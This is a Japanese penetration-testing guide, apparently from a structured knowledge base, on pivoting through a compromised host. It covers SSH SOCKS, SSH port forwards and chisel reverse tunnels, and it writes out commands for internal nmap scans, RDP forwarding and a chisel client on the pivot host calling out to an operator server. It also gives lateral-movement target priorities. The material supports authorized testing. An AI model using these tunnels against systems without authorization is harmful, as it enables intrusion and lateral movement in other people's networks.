# 07_pivot_tunneling（ssh_socks_chisel）

## 目的（この技術で到達する状態）
- "外側（自端末）から見える世界"ではなく、**侵害済みホスト/踏み台/社内端末などの「内側」から観測できる世界**を手元に持ち帰る
- 具体的には以下を満たす：
  1) あるネットワーク（A）にいる自分が、別ネットワーク（B）への通信を**B側の観測点**として発生させられる
  2) その通信の形（SOCKS/port forward/HTTP tunnel）を選び、**到達性（許可/遮断/監視）を分解**して説明できる
  3) トンネル経由で「列挙・スキャン・Webアクセス・管理プロトコル接続」を、**再現性ある手順**で実施できる
  4) 証跡（コマンド・設定・ポート・接続元/先）が残り、後から「何をしたか」を説明できる
  5) トンネルが壊れた時に、原因（DNS/経路/認証/ポート競合/MTU/keepalive/EDR遮断）を切り分けできる

---

## 前提（対象・範囲・想定）
- 対象：許可された診断/演習であること（契約スコープ）、Pivot端末にSSHサーバがある/入れられる、またはchiselを実行できる
- 想定する環境（例：クラウド/オンプレ、CDN/WAF有無、SSO/MFA有無）：
  - Egress（外向き通信）とIngress（外からの接続許可）の制約がある前提で設計する
  - Pivotは"通信の集約点"になるため、負荷が集中する
- できること/やらないこと（安全に検証する範囲）：
  - できること：SOCKSプロキシ（動的転送）、ポートフォワード（静的転送）、トンネル経由での列挙・スキャン・Webアクセス・管理プロトコル接続、証跡の取得
  - やらないこと：過剰な負荷（スキャンは **帯域・同時接続** を抑える（masscan等は特に））、競合（ローカルポート/リモートポートの衝突、既存プロキシ（企業端末のPAC等）との衝突に注意）、"外へ漏れる"を防ぐ（DNSリーク、直接接続、ルーティング設定ミス）
- 依存する前提知識（必要最小限）：
  - `01_topics/03_network/05_scanning_到達性把握（nmap_masscan）.md`
  - `01_topics/03_network/02_post_侵入後の前提（権限 経路 横展開の入口）.md`
- 扱う範囲（本ファイルの守備範囲）
  - 扱う：SOCKSプロキシ（動的転送）、ポートフォワード（静的転送）、トンネル経由での列挙・スキャン・Webアクセス・管理プロトコル接続
  - 扱わない（別ユニットへ接続）：
    - ルーティング型（L3っぽく見せる） → sshuttle等が候補になるが、別ファイルで扱うのが適切
    - サービス別の深掘り → `01_topics/03_network/09_smb_enum_共有・権限・匿名（null_session）.md` / `01_topics/03_network/11_ldap_enum_ディレクトリ境界（匿名_bind）.md` 等

---

## 観測ポイント（何を見ているか：プロトコル/データ/境界）
### 1) 物理/経路境界
- 観測対象（プロトコル/データ構造/やり取りの単位）：
  - VPN内か、社内LANか、隔離セグメントか
  - Pivot端末が "内部ターゲット" へルーティングできるか（GW/ACL）
- 境界の観点：
  - 資産境界（管理主体・委託先・対象範囲の線引き）：Pivot端末が "内部ターゲット" へルーティングできるか
  - 信頼境界（外部連携・第三者・越境ポイント）：VPN内か、社内LANか、隔離セグメントか
- 重要なフィールド/差分/状態（「ここが変わると意味が変わる」点）：
  - 経路境界の違いで到達可能範囲が変わる

### 2) FW/プロキシ境界（Egress/Ingress）
- 観測対象（プロトコル/データ構造/やり取りの単位）：
  - Pivot端末から外へ出られるか（例：443のみ許可、DNSだけ許可、全部禁止）
  - 自端末からPivot端末へ入れるか（SSHが開いているか、逆接続が必要か）
- 境界の観点：
  - 信頼境界：Pivot端末から外へ出られるか、自端末からPivot端末へ入れるか
- 重要なフィールド/差分/状態：
  - Egress/Ingressの制約でトンネルの方法が変わる

### 3) 認証境界（接続そのもの）
- 観測対象（プロトコル/データ構造/やり取りの単位）：
  - SSH鍵/パスワード、MFA、Jump host
  - chisel実行が許されるか（EDR/アプリ制御）
- 境界の観点：
  - 信頼境界：認証境界の違いでトンネルの方法が変わる
- 重要なフィールド/差分/状態：
  - 認証方式の違いでトンネルの方法が変わる

### 4) 名前解決境界（DNSリークの温床）
- 観測対象（プロトコル/データ構造/やり取りの単位）：
  - "内部FQDN"を解決したい時、解決はどこで起きるべきか
  - 自端末で解決してはいけない（外部DNSに漏れる/解決不能）
  - Pivot側/内部DNSで解決させる必要がある
- 境界の観点：
  - 信頼境界：名前解決境界の違いでDNSリークのリスクが変わる
- 重要なフィールド/差分/状態：
  - DNS解決の位置で情報漏えいのリスクが変わる

---

## 結果の意味（その出力が示す状態：何が言える/言えない）
- 何が"確定"できるか：
  - 物理/経路境界（VPN内か、社内LANか、隔離セグメントか、Pivot端末が "内部ターゲット" へルーティングできるか）
  - FW/プロキシ境界（Pivot端末から外へ出られるか、自端末からPivot端末へ入れるか）
  - 認証境界（SSH鍵/パスワード、MFA、Jump host、chisel実行が許されるか）
  - 名前解決境界（"内部FQDN"を解決したい時、解決はどこで起きるべきか）
- 何が"推定"できるか（推定の根拠/前提）：
  - トンネルの種類（SOCKSプロキシ/ポートフォワード/ルーティング型）で到達可能範囲が変わる
  - 失敗要因（DNS/経路/認証/ポート競合/MTU/keepalive/EDR遮断）を切り分けできる
- 何は"言えない"か（不足情報・観測限界）：
  - トンネルが成立しても、内部ターゲットへの到達が保証されるわけではない（経路/ACLが必要）
  - トンネルが壊れた時の原因特定には、区間分解（自端末→Pivot、Pivot→内部ターゲット、自端末→ローカルプロキシ、プロキシ経由のアプリ通信）が必要
- よくある状態パターン（正常/異常/境界がズレている等）：
  - パターンA：SSHで入れる（Inbound可）→SSH SOCKSでPivot
  - パターンB：SSHで入れる（Inbound可）→SSH Local Port Forwardで特定サービスを通す
  - パターンC：Inboundが厳しい（外から入れない）→chisel Reverseで外へ出てPivot

---

## 攻撃者視点での利用（意思決定：優先度・攻め筋・次の仮説）
- この状態が示す"狙い目"：
  - 外側から見えない資産（DC、管理ネット、内部API）に到達できるようになると、SMB/LDAP/Kerberosの列挙が可能になり、横展開が現実になる
  - Webも内部管理画面が対象に入る（認証/認可/ログの差分が出る）
- 優先度の付け方（時間制約がある場合の順序）：
  1) 管理系サービス（SMB/LDAP/Kerberos/WinRM/RDP）への到達
  2) 内部Web/管理画面への到達
  3) その他のサービスへの到達
- 代表的な攻め筋（この観測から自然に繋がるもの）：
  - 攻め筋1：Pivotは"情報の価値"を一段上げる → 外側から見えない資産（DC、管理ネット、内部API）に到達できるようになる
  - 攻め筋2："到達できたサービス"から次ファイルへ直結する → 445/SMBが見える → `09_smb_enum_共有・権限・匿名（null_session）.md`、389/636 LDAPが見える → `11_ldap_enum_ディレクトリ境界（匿名_bind）.md`、88 Kerberosが見える → `12_kerberos_asrep_kerberoast_成立条件.md`、3389 RDPが見える → `19_rdp_設定と認証（NLA）.md`、5985/5986 WinRMが見える → `18_winrm_psremoting_到達性と権限.md`
- 「見える/見えない」による戦略変更（例：CDN配下、SSO前提、外部委託先など）：
  - Inboundが厳しい（外から入れない）場合は、chisel Reverseで外へ出てPivotする
  - DNSリークを防ぐため、内部FQDNの解決はPivot側/内部DNSで行う

---

## 次に試すこと（仮説A/Bの分岐と検証）
### 仮説A：SSHで入れる（Inbound可）→SSH SOCKSでPivot
- 次の検証：
  - 自端末からSOCKS5を起動（SSH -D）、proxychains を設定、内部HTTPを観測（curlで最短確認）、内部ポート確認（nmapは"使い方を誤ると"詰む）、ブラウザ運用
- 期待する観測（成功/失敗時に何が見えるか）：
  - 成功：SOCKS越しに内部ターゲットへ到達できる
  - 失敗：SOCKSは立つが内部へ届かない（区間②の確認が必要）

### 仮説B：SSHで入れる（Inbound可）→SSH Local Port Forwardで特定サービスを通す
- 次の検証：
  - 内部RDP（3389）を自端末の13389に転送、内部Web（443）を自端末の18443に転送
- 期待する観測：
  - 成功：ポートフォワード経由で内部ターゲットへ到達できる
  - 失敗：ポートフォワードは立つが内部へ届かない（区間②の確認が必要）

### 仮説C：Inboundが厳しい（外から入れない）→chisel Reverseで外へ出てPivot
- 次の検証：
  - "受け口"にchisel server（reverse有効）を起動、Pivot端末からserverへ"外向き"に接続（client）、自端末から"server側SOCKS"を使う（proxychains等）
- 期待する観測：
  - 成功：chisel Reverse経由で内部ターゲットへ到達できる
  - 失敗：chisel Reverseは立つが内部へ届かない（区間②の確認が必要）

---

## 手を動かす検証（Labs連動：観測点を明確に）
- 検証環境（関連する `04_labs/`）
  - 参照ファイル：
    - `04_labs/02_virtualization/03_networking_nat_hostonly_bridge.md`
- 取得する証跡（目的ベースで最小限）：
  - Pivot設計メモ（観測点、手段、ローカルポート、到達確認ログ、リスク）
  - トンネルの状態（LISTEN確認）、proxychains適用漏れの確認、内部へ届くかの確認（Pivot上でのnc確認）
- 観測の取り方（どの視点で差分を見るか）：
  - 区間分解（自端末→Pivot、Pivot→内部ターゲット、自端末→ローカルプロキシ、プロキシ経由のアプリ通信）での差分
  - トンネルの種類（SOCKS/ポートフォワード/Reverse）での差分
- 実施方法（最高に具体的）：観測の準備と相関キー
  - 証跡ディレクトリ（必須）
    ~~~~
    mkdir -p ~/keda_evidence/pivot_tunneling 2>/dev/null
    cd ~/keda_evidence/pivot_tunneling
    ~~~~
  - 検証の前提を固定（スコープ事故を防ぐ）
    - 必須で決める（レポート先頭に書く）
      - 対象は **許可された診断/演習** のみ
      - 観測は **トンネル経由での列挙・スキャン・Webアクセス・管理プロトコル接続** のみ
      - 過剰な負荷は避ける（スキャンは **帯域・同時接続** を抑える）
      - DNSリーク対策、適用漏れ対策、負荷対策を実施する
  - 相関キー（最低限）を作る（後で必ず効く）
    - SourceIP、PivotIP、TargetIP、Port、Protocol、TunnelType、Status、Time

---

## コマンド/リクエスト例（例示は最小限・意味の説明が主）
> 例示は"手段"であり"結論"ではない。必ず「何を観測している例か」を添える。

### シナリオA：SSH Dynamic SOCKS（-D）で"内側のTCP"をまとめて運ぶ

#### 0) 事前確認（Pivot上でやる：内部へ届くか）
~~~~
# Pivot端末で実行（例）
ip a
ip r
# 代表ポートに対して到達（例：SMB/LDAP/RDP/HTTP）
nc -vz 10.10.20.10 445
nc -vz 10.10.20.11 389
nc -vz 10.10.20.12 3389
~~~~
- この例で観測していること：Pivot端末から内部ターゲットへの到達性確認
- 判断：ここで届かないなら、Pivotを作っても届かない（経路/ACL問題）。届くなら、以降は"自端末→Pivot"の経路を作るだけ

#### 1) 自端末からSOCKS5を起動（SSH -D）
~~~~
# 自端末（Kali等）で実行
# 1080にSOCKS5を作る。-N（シェル不要）, -f（バックグラウンド）, -C（圧縮は状況次第）
ssh -D 127.0.0.1:1080 -N <user>@<pivot_ip>

# 成功確認（自端末）
ss -lntp | grep 1080
~~~~
- この例で観測していること：SOCKS5プロキシの起動と確認
- 判断：ローカルに1080がLISTENしていればSOCKSは立っている（ただし内部へ通る保証はまだ）

#### 2) proxychains を設定（"適用漏れ"を防ぐ）
~~~~
# 設定ファイルを編集（例）
sudo sed -n '1,200p' /etc/proxychains4.conf
# 末尾付近に以下のイメージで追加/確認
# socks5  127.0.0.1 1080
~~~~
- この例で観測していること：proxychains設定でプロキシ経由を強制
- 判断：proxychainsは「このコマンドはプロキシ経由」を強制できるため、実務でのミスを減らす。DNSリーク対策：proxychainsのDNS設定（環境によるが"プロキシDNS"を意識する）

#### 3) 内部HTTPを観測（curlで最短確認）
~~~~
# まずはIP直指定で内部HTTP
proxychains -q curl -I http://10.10.20.50/

# HTTPSの場合（証明書は観測優先で -k）
proxychains -q curl -kI https://10.10.20.50/

# もし内部FQDNが必要なら、Hostを合わせる（DNSより先に"HTTP到達"を確定）
proxychains -q curl -kI https://10.10.20.50/ -H 'Host: internal-app.local'
~~~~
- この例で観測していること：SOCKS越しでの内部HTTP/HTTPSへの到達性確認
- 判断：レスポンスが返れば「自端末→SOCKS→Pivot→内部HTTP」が成立。タイムアウトなら、次の切り分けへ

#### 4) 内部ポート確認（nmapは"使い方を誤ると"詰む）
~~~~
# SOCKS越しの到達確認としてのnmap（-sT）
proxychains -q nmap -sT -Pn -n -p 80,443,445,389,3389 10.10.20.0/24 --open -oN nmap_over_socks.txt
~~~~
- この例で観測していること：SOCKS越しでの内部ポートスキャン
- 判断：-sS（SYN）をSOCKS越しで期待しない（RAWパケットは出せないため）。ここで得た"到達できるポート"を次工程（SMB/LDAP等）に渡す

#### 5) ブラウザ運用（"ここが一番事故る"）
- ブラウザのプロキシ設定でSOCKS5 127.0.0.1:1080
- 重要：DNSの扱い
  - "SOCKS越しにDNS解決"できていないと内部FQDNが引けず詰む
  - まずはIP直アクセスで到達性を確定→次にDNS解決へ進む（順序が重要）

### シナリオB：SSH Local Port Forward（-L）で"特定サービスを確実に通す"

#### 代表例1：内部RDP（3389）を自端末の13389に転送
~~~~
# 自端末で実行：localhost:13389 → pivot → 10.10.20.12:3389
ssh -L 127.0.0.1:13389:10.10.20.12:3389 -N <user>@<pivot_ip>

# 成功確認
ss -lntp | grep 13389

# 以降はRDPクライアントを localhost:13389 に向ける
~~~~
- この例で観測していること：特定サービス（RDP）のポートフォワード
- 判断："この1つを確実に通したい" → -L、"いろいろ通したい" → -D（SOCKS）

#### 代表例2：内部Web（443）を自端末の18443に転送（Hostヘッダが必要な場合に有効）
~~~~
ssh -L 127.0.0.1:18443:10.10.20.50:443 -N <user>@<pivot_ip>

# curlで確認（SNI/Hostが絡むなら --resolve を使う）
curl -vkI https://127.0.0.1:18443/ -H 'Host: internal-app.local'
~~~~
- この例で観測していること：特定サービス（HTTPS）のポートフォワード、SNI/Hostヘッダの扱い
- 判断："この1つを確実に通したい" → -L、"外からPivotに入れない" → chisel reverse

### シナリオC：chisel Reverse（外へ出られる）で"入れない環境"を突破して観測点を移す

#### 前提となる境界の整理（成立条件を先に言語化）
- Pivot端末 → あなたの受け口（server）へ **外向き接続** できる（典型：443/tcpのみ）
- あなた側で待受できる（クラウドVM/社内検証環境など、許可された受け口）
- chiselが動作可能（実行制御・EDRで止まる可能性）

#### 1) "受け口"にchisel server（reverse有効）を起動
~~~~
# あなた側（server側）で実行
# 例：0.0.0.0:8443で待受、reverseを許可
./chisel server --reverse -p 8443
~~~~
- この例で観測していること：chisel serverの起動（reverse有効）
- 判断：受け口は「あなたが制御できる場所」。ここにサーバを立てる

#### 2) Pivot端末からserverへ"外向き"に接続（client）
~~~~
# Pivot端末で実行（serverへ外向き接続）
./chisel client <server_ip>:8443 R:socks
~~~~
- この例で観測していること：Pivot端末からserverへの外向き接続
- 判断：この時点での意味：server側にSOCKS（動的プロキシ）が生える（実装・設定によりポートが決まる）。以降、あなたはserver側のSOCKSに繋いで内部へ行ける

#### 3) 自端末から"server側SOCKS"を使う（proxychains等）
~~~~
# 例：proxychains設定に server:1080 のようなSOCKSを登録（chiselの出力に従う）
# socks5 <server_ip> <socks_port>
~~~~
- この例で観測していること：server側SOCKSの利用
- 判断：あなたの端末がserverに到達できる前提で、SOCKSを設定する。以降はシナリオAと同様に、proxychainsで内部へアクセスする

#### 4) "静的ポートフォワード"もreverseで作れる（R:）
~~~~
# 例：server側の13389 → Pivot経由 → 内部RDP(10.10.20.12:3389)
./chisel client <server_ip>:8443 R:13389:10.10.20.12:3389
~~~~
- この例で観測していること：chisel Reverseでの静的ポートフォワード
- 判断：これにより、あなたはserverの13389へRDP接続し、内部へ到達できる

### 失敗時の切り分け（"何が悪いか"を最短で特定）
> Pivotは失敗要因が多い。闇雲に設定を増やすと泥沼になる。  
> いつでも「どの区間が死んでいるか」を分解して確認する。

#### 1) 区間分解（必ずこれで考える）
- 区間①：自端末 → Pivot（SSHが張れるか、認証が通るか）
- 区間②：Pivot → 内部ターゲット（Pivot上で直接届くか）
- 区間③：自端末 → ローカルプロキシ（SOCKSがLISTENしているか）
- 区間④：プロキシ経由のアプリ通信（proxychains適用漏れ/ツール非対応）

#### 2) よくある詰まりと対処
- SSHは張れるが、proxychains経由通信がタイムアウト
  - 対処：Pivot上で同じ宛先へ `nc -vz`（区間②の確認）
  - 対処：ツールを `curl` で最小確認（HTTPなら最短）
- 内部FQDNが引けない
  - 対処：まずIP直アクセスで到達性を確定（DNS問題と分離）
  - 対処：DNS解決を"どこで行うべきか"を決める（Pivot側/内部DNS）
- nmapが不自然な結果になる
  - 対処：SOCKS越しは `-sT` 前提。SYNスキャンを期待しない
- トンネルがすぐ切れる
  - 対処：SSH keepalive設定、回線品質、EDRの遮断（ログ確認）
- ポート競合
  - 対処：ローカルのLISTEN確認（ss/netstat）、別ポートへ変更

---

## 攻撃者視点での利用（意思決定：優先度・攻め筋・次の仮説）
### 1) Pivotは“情報の価値”を一段上げる
- 外側から見えない資産（DC、管理ネット、内部API）に到達できるようになると、
  - SMB/LDAP/Kerberosの列挙が可能になり、横展開が現実になる
  - Webも内部管理画面が対象に入る（認証/認可/ログの差分が出る）

### 2) “到達できたサービス”から次ファイルへ直結する
- 445/SMBが見える → `09_smb_enum_共有・権限・匿名（null_session）.md`
- 389/636 LDAPが見える → `11_ldap_enum_ディレクトリ境界（匿名_bind）.md`
- 88 Kerberosが見える → `12_kerberos_asrep_kerberoast_成立条件.md`
- 3389 RDPが見える → `19_rdp_設定と認証（NLA）.md`
- 5985/5986 WinRMが見える → `18_winrm_psremoting_到達性と権限.md`

---

## ガイドライン対応（ASVS / WSTG / PTES / MITRE ATT&CK：毎回記載）
- ASVS：
  - 該当領域/章：トンネル/プロキシは「境界（ネットワーク分離・認証境界）」を跨ぐ実装そのもの。ASVSの個別要件というより、**"運用・構成上の境界がどう成立しているか"** を検証する前提（管理系到達、内部API到達、監視/ログ、認証強制）
  - 該当要件（可能ならID）：該当なし（NW前提技術）
  - このファイルの内容が「満たす/破れる」ポイント：
    - 満たす：境界の実効性（管理面露出/ネットワーク分離/証跡）を検証するための前提として、到達経路（プロキシ/トンネル）を"観測可能な形"で確立する
    - 破れる：トンネル/プロキシが確立できない場合、境界の実効性を検証できない
  - 参照：https://github.com/OWASP/ASVS
- WSTG：
  - 該当カテゴリ/テスト観点：Webテスト対象に"到達できない"時、WSTGのテスト項目を実施できない。Pivotで観測点を移し、**内部管理画面・内部API・メタデータ等のテスト対象**を現実的にする
  - 該当が薄い場合：この技術が支える前提（情報収集/境界特定/到達性推定 等）：
    - 認証/認可/入力の検証は「到達経路が確立している」ことが前提。Pivotはその前提条件を作る
  - 参照：https://owasp.org/www-project-web-security-testing-guide/
- PTES：
  - 該当フェーズ：Post-Exploitation、Lateral Movement
  - 前後フェーズとの繋がり（1行）：Post-Exploitationでの到達性確立（Pivot）→内部列挙→横展開の入り口を作る。成功/失敗を境界（区間）で説明できることが品質
  - 参照：https://pentest-standard.readthedocs.io/
- MITRE ATT&CK：
  - 該当戦術（必要なら技術）：Command and Control
  - 攻撃者の目的（この技術が支える意図）：T1090 Proxy（Pivotの中心）、T1572 Protocol Tunneling（HTTP(S)等でトンネル）。Pivotで観測点を移し、DiscoveryとRemote Servicesを成立させる
  - 参照：https://attack.mitre.org/tactics/TA0011/（Command and Control）

---

## 参考（必要最小限）
- `01_topics/03_network/05_scanning_到達性把握（nmap_masscan）.md`
- `01_topics/03_network/02_post_侵入後の前提（権限 経路 横展開の入口）.md`
- chisel公式ドキュメント
- SSH公式ドキュメント（-D / -L / -R オプション）

---

## リポジトリ内リンク（最大3つまで）
- 関連 topics：
  - `01_topics/03_network/05_scanning_到達性把握（nmap_masscan）.md`
  - `01_topics/03_network/09_smb_enum_共有・権限・匿名（null_session）.md`
  - `01_topics/03_network/11_ldap_enum_ディレクトリ境界（匿名_bind）.md`
- 関連 playbooks：
  - `02_playbooks/06_network_enum_to_post_列挙→侵入後の導線.md`
- 関連 labs / cases：
  - `04_labs/02_virtualization/03_networking_nat_hostonly_bridge.md`

---

## 深掘りリンク（最大8）
- `01_topics/03_network/05_scanning_到達性把握（nmap_masscan）.md`
- `01_topics/03_network/06_service_fingerprint（banner_tls_alpn）.md`
- `01_topics/03_network/08_firewall_waf_検知と回避の境界（観測中心）.md`
- `01_topics/03_network/09_smb_enum_共有・権限・匿名（null_session）.md`
- `01_topics/03_network/11_ldap_enum_ディレクトリ境界（匿名_bind）.md`
- `01_topics/03_network/12_kerberos_asrep_kerberoast_成立条件.md`
- `01_topics/03_network/18_winrm_psremoting_到達性と権限.md`
- `01_topics/03_network/19_rdp_設定と認証（NLA）.md`
